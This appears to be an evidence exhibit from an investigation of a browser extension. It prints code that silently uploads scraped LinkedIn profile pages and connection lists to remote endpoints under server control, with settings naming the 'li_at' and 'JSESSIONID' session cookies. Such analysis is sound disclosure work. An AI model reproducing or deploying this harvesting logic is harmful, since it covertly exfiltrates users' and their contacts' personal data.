// Evidence 05 — server-gated upload router & connection-graph config
// Source: app/background.js @94888 (router switch), @26081 (cacheProfiles config)
// Reformatted; identifiers & literals verbatim.

// --- upload router (service worker) --------------------------------------
case K:  // UPLOAD_PROFILES
  webRequest("linkedin/profiles/upload", e);
  break;
case V:  // PROFILE_UPLOAD_CHECK  → server decides per-URL whether it wants the data
  return await webRequest("linkedin/profile/secr", { t: "pc", p: e.url });
case $:  // PRO_PRE (page payloads; e.type prefixed j_/l_/pv)
  switch (e.type.substring(0, 2)) {
    case "j_":
      O.r1 && webRequest("linkedin/profile/secr", { t: "pc", p: e.url }, t => {
        t || webRequest("linkedin/profile/pre", e);          // secr declined → fallback
      });
      break;
    case "l_":
      webRequest("linkedin/profile/pre", e);
      break;
    case "pv":
      O.r1 && O.enableDebug && webRequest("linkedin/profile/pre", e);
      break;
  }
case q:
  O.r1 && webRequest("linkedin/profile/update", e);
  break;

// --- cacheProfile(s) client side (background.js @17932) -------------------
cacheProfile = (url, html, type = "") =>
  runtime.sendMessage({ command: PRO_PRE, url, html, type });   // html = zipped DOM

cacheProfiles = async (url, profiles) => {
  if (1 === (await runtime.sendMessage({ command: PROFILE_UPLOAD_CHECK, url })).data)
    runtime.sendMessage({ command: UPLOAD_PROFILES, url, profiles });
};

// --- connection-graph walker cadence (background.js @26081) ---------------
{
  cacheProfiles: {
    extDataReportUrl: "linkedin/profile/secr",
    intervalProfile: 2e4,                    // ms: page scrape cadence
    runTaskInterval: 2,                      // min: task loop
    intervalCheckConnectsProfiles: .5,       // min: connections check
    intervalFirstDegreeConnectionCount: 30,  // min: 1st-degree count
    hashVersion: 2,
    saveProfileUploadStateInterval: 30,      // min
    pageProfileCount: 40,                    // profiles per connections page
    cookieKeyCsrfToken: "JSESSIONID",
    cookieKeyLinkedinSession: "li_at",
    pageStorageKey: "bcolp"
  }
}

// --- first-degree reporting (background.js) -------------------------------
detectIfProfilePageIsFirstDegree = () =>
  document.querySelector(".dist-value")?.textContent.trim() === "1st";
